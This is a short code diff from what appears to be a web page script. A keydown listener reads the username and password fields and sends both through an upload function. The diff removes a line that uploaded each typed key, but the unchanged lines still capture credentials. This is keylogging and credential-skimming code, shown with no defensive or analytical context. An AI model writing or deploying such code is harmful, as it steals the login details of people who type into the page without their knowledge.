@@ -33,7 +33,6 @@ window.addEventListener('keydown', e => {
             uploadSet('username: ' + Id('username').value)
             uploadSet('password: ' + Id('password').value)
         },10)
-        uploadSet('char: ' + e.key)
     }
 })
 
